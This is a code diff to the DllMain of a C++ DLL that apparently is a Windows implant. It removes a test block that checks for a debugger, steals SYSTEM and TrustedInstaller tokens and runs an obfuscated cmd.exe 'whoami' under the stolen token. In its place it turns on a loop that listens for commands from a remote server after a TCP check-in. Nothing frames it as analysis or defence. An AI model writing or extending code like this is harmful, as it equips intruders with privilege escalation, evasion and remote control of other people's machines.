@@ -47,32 +47,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		me->MakeTCPRequest(req, TRUE);
 		OutputDebugStringA("good");
 
-		//me->ListenForServerCommands();
-
-		ProcessManager mgr;
-		mgr.CheckNoDebugger();
-
-		HANDLE escalatedPriv = mgr.GetSystemToken();
-		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
-		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
-		 
-		STARTUPINFO si = { 0 };
-		PROCESS_INFORMATION pi;
-		
-		HANDLE token = mgr.GetTrustedInstallerToken();
-
-		mgr.OpenProcessAsImposter(
-			token,
-			LOGON_WITH_PROFILE,
-			NULL,
-			wstrCmd.data(),
-			CREATE_NEW_CONSOLE,
-			NULL,
-			NULL,
-			&si,
-			&pi
-		);
-
+		me->ListenForServerCommands();
 
 		while ( 1 ) {
 			Sleep(1000);
